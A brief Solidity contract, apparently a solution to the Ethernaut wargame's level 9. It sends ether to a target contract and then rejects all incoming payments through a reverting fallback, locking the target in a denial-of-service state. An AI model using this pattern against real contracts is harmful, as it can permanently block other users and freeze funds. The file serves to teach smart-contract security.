// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut09 {
    function hack(address _address) public payable {
        address payable addr = payable(_address);
        addr.transfer(msg.value);
    }

    fallback() external payable {
        revert();
    }
}